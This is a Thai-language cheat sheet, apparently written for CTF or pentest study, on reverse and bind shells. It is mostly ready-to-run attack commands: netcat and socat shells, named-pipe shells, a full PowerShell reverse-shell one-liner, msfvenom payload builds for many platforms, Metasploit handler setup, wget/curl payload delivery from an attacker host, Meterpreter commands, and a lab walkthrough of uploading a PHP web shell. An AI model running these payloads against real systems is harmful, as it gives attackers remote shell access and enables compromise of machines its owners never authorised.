Reverse Shell
ลำดับการทำงาน:
เรา (attacker) เปิด listener รอรับการเชื่อมต่อ
sudo nc -lvnp 443


เป้าหมายรันคำสั่งให้เชื่อมกลับมาหาเรา
nc <LOCAL-IP> <PORT> -e /bin/bash

ข้อดี:
มักทะลุ firewall ง่ายกว่า เพราะเป็น outbound connection (เครื่องเหยื่อโทรออกเอง)
ข้อเสีย:
เราต้องตั้งค่า listener ที่เครื่องเราเอง (บางกรณีต้อง port forwarding ถ้าผ่านอินเทอร์เน็ต)

Bind Shell
ลำดับการทำงาน:
บนเครื่องเหยื่อเปิด listener พร้อม shell
nc -lvnp <port> -e cmd.exe   # ตัวอย่าง Windows

เราเชื่อมเข้าไป
nc MACHINE_IP <port>

ข้อดี:
เราไม่ต้อง config network ฝั่งเรา
ง่ายในบางสถานการณ์
ข้อเสีย:
Firewall ฝั่งเหยื่ออาจบล็อก inbound connections เข้ามาที่พอร์ตที่เปิดไว้




Interactive Shell
คือ shell แบบปกติ เช่น Bash, Zsh, PowerShell
พิมพ์คำสั่งแล้วโปรแกรมขอ input ได้
เช่น SSH จะถาม yes/no → ต้อง interactive
🔹 Non-Interactive Shell
shell ที่รันคำสั่งได้เฉพาะคำสั่งที่ ไม่ต้องรอ input เพิ่มเติม
reverse/bind shell ส่วนมากเป็น non-interactive
คำสั่งธรรมดา เช่น ls, whoami รันได้ปกติ
คำสั่ง interactive เช่น ssh, passwd, sudo → มักไม่ทำงาน (จะไม่มี output ใด ๆ)


สรุปสั้นที่สุด
Reverse shell: เหยื่อเชื่อมกลับมาหาเรา → ใช้ง่ายกว่า firewall ส่วนมากอนุญาต outbound
Bind shell: เหยื่อเปิด port ให้เราเชื่อมเข้าไป → ต้องไม่โดน firewall ฝั่งเหยื่อบล็อก
Interactive shell: พิมพ์โต้ตอบโปรแกรมได้
Non-interactive shell: ทำได้แค่คำสั่งที่ไม่ต้องถามอะไรเพิ่ม เช่น ls, whoami



Netcat
Reverse shell
เครื่องเหยื่อ (Target) “ย้อนกลับ” มาหาเครื่องเรา (Attacker)
➡ เราต้องเปิด listener รอรับเชลล์
        
        nc -lvnp <port-number>

จากนั้นเหยื่อจะรัน payload ให้เชื่อมกลับมาที่ IP:443 → เราจะได้ interactive shell
Reverse Shell มักใช้บ่อยที่สุด เพราะไฟร์วอลล์ของเหยื่อมักอนุญาต outbound

Bind Shell
เครื่องเหยื่อ “เปิดพอร์ตไว้รอ” แล้วฝ่ายเราไปเชื่อมเข้าไปเอง
วิธีเชื่อมเข้าไป

        nc <target-ip> <port>

เหยื่อเปิด listener → เราแค่ connect → ได้ shell

| ประเภท            | ใครเป็น Listener | ใคร Connect       | ใช้บ่อยกว่า       |
| ----------------- | ---------------- | ----------------- | ----------------- |
| **Reverse Shell** | Attacker         | Target → Attacker | ✔ ใช้บ่อย         |
| **Bind Shell**    | Target           | Attacker → Target | ⚠ มักติด firewall |



*---------------------------------------------------------------------------------------------------*
แนวคิดหลักของ Socat

Socat = “ตัวเชื่อม” ระหว่าง สองจุด (เหมือน Portal Gun)

ตัวอย่างจุดเชื่อม เช่น:

พอร์ต ↔ คีย์บอร์ด

พอร์ต ↔ พอร์ต

พอร์ต ↔ ไฟล์

ใช้ได้ทั้ง Linux และ Windows

#####
Reverse shell
Listener (ฝั่ง Attacker)

        socat TCP-L:<port> -

ฟังพอร์ต + ต่อเข้ากับ STDIN/STDOUT (เหมือน nc -lvnp <port>)

การส่ง shell (ฝั่ง Target)
Windows Target

        socat TCP:<ATTACKER-IP>:<PORT> EXEC:powershell.exe,pipes

pipes → บังคับ PowerShell ให้ใช้ STDIN/STDOUT แบบ Unix

Linux Target

        socat TCP:<ATTACKER-IP>:<PORT> EXEC:"bash -li"


#####
Bind Shell ด้วย Socat
Listener บน Target
✔ Linux Target

        socat TCP-L:<PORT> EXEC:"bash -li"

✔ Windows Target

        socat TCP-L:<PORT> EXEC:powershell.exe,pipes

Connect จาก Attacker

        socat TCP:<TARGET-IP>:<TARGET-PORT> -

สรุปสุดท้าย (จำไว้แบบง่ายที่สุด)

nc = เชลล์แบบง่าย
socat = เชลล์แบบสมบูรณ์

*-------------------------------------------------------------------*
🔥 สรุปเรื่อง Payloads ด้วย Netcat & Powershell
✅ 1) Netcat มีรุ่นที่รองรับ -e
บาง version ของ netcat (nc) เช่น:
nc.exe ที่อยู่ใน Kali (/usr/share/windows-resources/binaries)
netcat-traditional ใน Kali
มี option:

        -e <program>

✔ Bind shell (Listener)
nc -lvnp <PORT> -e /bin/bash

✔ Reverse shell (Target → Attacker)
nc <ATTACKER-IP> <PORT> -e /bin/bash

✅ 2) ถ้า Netcat ไม่มี -e → ใช้วิธี Named Pipe แทน

✔ Bind Shell listener (Linux)
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

✔ Reverse Shell (Linux)
mkfifo /tmp/f; nc <IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

✅ 3) Powershell Reverse Shell (Windows)

1 liner ที่ใช้บ่อยมาก:
        powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

*--------------------------------------------------------------------------------*

🧨 MSFVENOM — ใช้ทำอะไร?
เป็นส่วนหนึ่งของ Metasploit
เอาไว้ สร้าง payload เช่น
Reverse shell
Bind shell
Meterpreter
ออกเป็นไฟล์ได้หลายแบบ เช่น .exe, .aspx, .war, .py, .elf, .php

🧱 โครงสร้างคำสั่งพื้นฐาน

        msfvenom -p <PAYLOAD> <OPTIONS>

🎯 ตัวอย่าง Reverse Shell Windows 64-bit แบบ exe

        msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<IP> LPORT=<PORT>

| Option  | ความหมาย                                       |
| ------- | ---------------------------------------------- |
| `-p`    | เลือก payload                                  |
| `-f`    | ระบุ format เช่น exe, elf, raw, asp, aspx, war |
| `-o`    | ตั้งชื่อไฟล์ output                            |
| `LHOST` | IP ฝั่งเราที่ให้ reverse shell เชื่อมกลับ      |
| `LPORT` | Port ฝั่งเรา                                   |

🧱 1) โครงสร้างคำสั่งพื้นฐาน
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <OUTPUT>

🎯 ตัวอย่าง Reverse Shell Windows 64-bit แบบ exe

msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<IP> LPORT=<PORT>

| OS      | Staged                      | Stageless                   | Meterpreter Staged                | Meterpreter Stageless             |
| ------- | --------------------------- | --------------------------- | --------------------------------- | --------------------------------- |
| Windows | windows/shell/reverse_tcp   | windows/shell_reverse_tcp   | windows/meterpreter/reverse_tcp   | windows/meterpreter_reverse_tcp   |
| Linux   | linux/x86/shell/reverse_tcp | linux/x86/shell_reverse_tcp | linux/x86/meterpreter/reverse_tcp | linux/x86/meterpreter_reverse_tcp |
| PHP     | php/reverse_php             | -                           | -                                 | -                                 |
| Java    | java/jsp_shell_reverse_tcp  | -                           | -                                 | -                                 |


*---------------------------------------------------------------------------------------------------------------------*

🚀 ขั้นตอนใช้งาน Multi/Handler (เรียงเป็นลำดับ)
ใช้แทน netcat เมื่อ payload ต้องการ Metasploit listener
เหมาะมากเวลาใช้ msfvenom เพื่อสร้าง payload ฝั่งเหยื่อ

msfconsole
use multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp (🔹 PAYLOAD — payload ที่ใช้ตอนสร้างด้วย msfvenom)
set LHOST 10.10.10.5
set LPORT 443
exploit
💡 หมายเหตุสำคัญ
🔸 ถ้าฟัง port ต่ำกว่า 1024 ต้องใช้ sudo
เช่น 80, 443

        sudo msfconsole

รอเหยื่อรัน payload → ได้ session

sessions 1

# Multi/Handler Payload Usage Cheat Sheet (All OS)

| OS / Platform | Payload (Staged) | Payload (Stageless) | ตัวอย่างคำสั่ง Multi/Handler |
|---------------|------------------|----------------------|-------------------------------|
| **Linux x64** | linux/x64/meterpreter/reverse_tcp | linux/x64/meterpreter_reverse_tcp | ```use multi/handler\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST 10.10.10.5\nset LPORT 4444\nexploit -j``` |
| **Linux x86** | linux/x86/meterpreter/reverse_tcp | linux/x86/meterpreter_reverse_tcp | ```use multi/handler\nset PAYLOAD linux/x86/meterpreter/reverse_tcp\nset LHOST 10.10.10.5\nset LPORT 4444\nexploit -j``` |
| **Linux Shell x64** | linux/x64/shell/reverse_tcp | — | ```use multi/handler\nset PAYLOAD linux/x64/shell/reverse_tcp\nset LHOST 10.10.10.5\nset LPORT 4444\nexploit -j``` |
| **Windows x64** | windows/x64/meterpreter/reverse_tcp | windows/x64/meterpreter_reverse_tcp | ```use multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 10.10.10.5\nset LPORT 4444\nexploit -j``` |
| **Windows x86** | windows/meterpreter/reverse_tcp | windows/meterpreter_reverse_tcp | ```use multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 10.10.10.5\nset LPORT 4444\nexploit -j``` |
| **Windows Shell** | windows/shell/reverse_tcp | — | ```use multi/handler\nset PAYLOAD windows/shell/reverse_tcp\nset LHOST 10.10.10.5\nset LPORT 4444\nexploit -j``` |
| **macOS x64** | osx/x64/meterpreter/reverse_tcp | — | ```use multi/handler\nset PAYLOAD osx/x64/meterpreter/reverse_tcp\nset LHOST 10.10.10.5\nset LPORT 4444\nexploit -j``` |
| **macOS Shell** | osx/x64/shell_reverse_tcp | — | ```use multi/handler\nset PAYLOAD osx/x64/shell_reverse_tcp\nset LHOST 10.10.10.5\nset LPORT 4444\nexploit -j``` |
| **Android** | android/meterpreter/reverse_tcp | — | ```use multi/handler\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST 10.10.10.5\nset LPORT 4444\nexploit -j``` |
| **PHP** | php/meterpreter/reverse_tcp | — | ```use multi/handler\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST 10.10.10.5\nset LPORT 4444\nexploit -j``` |
| **Python** | python/meterpreter/reverse_tcp | — | ```use multi/handler\nset PAYLOAD python/meterpreter/reverse_tcp\nset LHOST 10.10.10.5\nset LPORT 4444\nexploit -j``` |
| **Java** | java/meterpreter/reverse_tcp | — | ```use multi/handler\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST 10.10.10.5\nset LPORT 4444\nexploit -j``` |
| **NodeJS** | nodejs/shell_reverse_tcp | — | ```use multi/handler\nset PAYLOAD nodejs/shell_reverse_tcp\nset LHOST 10.10.10.5\nset LPORT 4444\nexploit -j``` |

🛠️ MSFVENOM + MULTI/HANDLER WORKFLOW CHEAT SHEET
สำหรับ CTF / Pentest — รองรับทุก OS
📌 1. เตรียม Listener (Attacker)
เปิด Metasploit:

        msfconsole


โหลดโมดูล:

        use multi/handler


ตั้งค่า Payload:   

        set PAYLOAD <payload>


ตั้งค่า IP และ Port สำหรับรับเชลล์:

        set LHOST <your-ip>
        set LPORT <port>


เริ่มฟังแบบ background:

        exploit -j

📌 2. สร้าง Payload ด้วย Msfvenom

โครงสร้างคำสั่ง:

        msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <filename>

🔹ตัวอย่าง (Linux 64-bit Meterpreter Reverse Shell)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=443 -f elf -o shell

📌 3. ส่ง Payload ไปยัง Target

วิธีที่ใช้บ่อย:

    wget http://<attacker-ip>/shell -O /tmp/shell (python3 -m http.server 80 เปิดที่ attacker ก่อน)
    
    curl -L http://<attacker-ip>/shell -o /tmp/shell
    EX : curl http://10.10.10.5/shell -o /tmp/shell
         chmod +x /tmp/shell
         /tmp/shell
    
    scp shell user@target:/tmp/


หรืออัปโหลดผ่านเว็บช่องโหว่

📌 4. ให้ Target ตั้งสิทธิ์รันไฟล์ (Linux)

        chmod +x shell

📌 5. ให้ Target รัน Payload

        ./shell

📌 6. Attacker จับ Reverse Shell
ดู session:

        sessions


เปิด session:

        sessions -i 1

📌 7. คำสั่ง Meterpreter ที่ใช้บ่อย
        sysinfo
        getuid
        shell
        ps
        migrate <pid>
        upload <file> <path>
        download <path>

🧩 Workflow Summary Table
Step	Device	Description	Example
1	Attacker	เปิด Listener	use multi/handler
2	Attacker	สร้าง Payload	msfvenom -p ...
3	Both	ส่ง Payload ไป Target	wget/curl/scp
4	Target	chmod เพื่อรัน	chmod +x shell
5	Target	รัน Payload	./shell
6	Attacker	จับ Reverse Shell	sessions -i 1
7	Attacker	Post-exploit	meterpreter cmds
        

*---------------------------------------------------------------------------------------------------------------------*





EXAMPLE:

cp php-reverse-shell.php to Desktop

        cp /usr/share/webshells/php/php-reverse-shell.php .

แก้ payload 

ตั้ง listener(1)

        -lvnp 1234

upload file php-reverse-shell.php

เปิด http://xx.xx.xx.xx/uploads แล้วเปิดไฟล์ php-reverse-shell.php

(listener 2)เปิด -lvnp 777

listener(1) connect กลับมา

        nc <LOCAL-IP attacker> 777 -e /bin/bash

listener(2) ctrl c เพื่อออก 

listener(2) ssh <username>@<ip-target> 

listener(2) ได้ shell มาแล้ว

        mkfifo /tmp/f; nc -lvnp 8080 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

listener(3) nc <target-ip> <port> เพื่อ connect กับ shell

listener(3)

        ls
        whoami
        cd ..
        ls
        cd ..
        ls

listener(2) ctrl c เพื่อออก 

        socat TCP:<LOCAL-IP-attacker>:1234 EXEC:"bash -li"

listener(3) ctrl c เพื่อออก

        socat TCP-L:1234 -

listener(2) telnet <Your_IP-attacker> 8080 | /bin/sh | telnet <Your_IP-attacker> 8081
        telnet 10.48.107.199 8080 | /bin/bash | telnet 10.48.107.199 8081

lsitener(4) nc -lvnp 8080
listener(5) nc -lvnp 8081
        ดูผลลัพท์การ connect ได้ที่ listener(5) ใช้ listener(4) ใส่ command: ls,whoami


